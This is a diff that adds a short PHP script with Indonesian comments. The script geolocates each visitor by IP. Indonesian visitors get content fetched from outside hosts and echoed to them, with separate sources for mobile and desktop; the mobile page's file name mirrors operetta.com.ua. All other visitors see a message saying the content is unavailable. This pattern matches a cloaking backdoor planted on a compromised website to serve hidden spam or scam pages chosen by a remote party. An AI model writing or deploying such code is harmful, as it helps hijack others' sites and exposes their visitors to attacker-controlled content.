@@ -1,0 +1,32 @@
+<?php
+
+// Mendapatkan IP pengguna
+$user_ip = $_SERVER['REMOTE_ADDR'];
+
+// Mendapatkan data lokasi dari IP
+$location_data = json_decode(file_get_contents("http://ip-api.com/json/{$user_ip}"));
+
+// Mengecek apakah pengguna berada di Indonesia
+if ($location_data->country === 'Indonesia') {
+    
+    // Mengecek apakah pengguna menggunakan perangkat mobile
+    if (preg_match('/Mobile|Android|iPhone|iPad/', $_SERVER['HTTP_USER_AGENT'])) {
+        // Mengambil konten untuk versi mobile
+        $url = 'https://pub-9ac899cf166c498fa482c500908726f0.r2.dev/amp.operetta.com.ua.html';
+    } else {
+        // Mengambil konten untuk versi desktop
+        $url = 'https://includes-page.com/cmd/operetta.com.ua/lp.txt';
+    }
+
+    // Mengambil konten dari URL
+    $content = file_get_contents($url);
+    
+    // Menampilkan konten
+    echo $content;
+
+} else {
+    // Menampilkan pesan jika tidak berada di Indonesia
+    echo "Konten hanya tersedia untuk pengguna di Indonesia.";
+}
+
+?>
